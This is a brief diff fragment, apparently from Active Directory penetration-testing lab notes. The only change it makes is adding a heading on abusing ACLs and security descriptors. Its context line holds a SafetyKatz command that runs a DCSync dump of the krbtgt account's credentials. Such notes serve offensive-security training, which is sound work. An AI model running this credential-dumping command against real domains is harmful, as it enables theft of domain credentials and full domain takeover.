@@ -595,4 +595,6 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 
 
 
+# **Using ACLs - Security Descriptors**
+
 
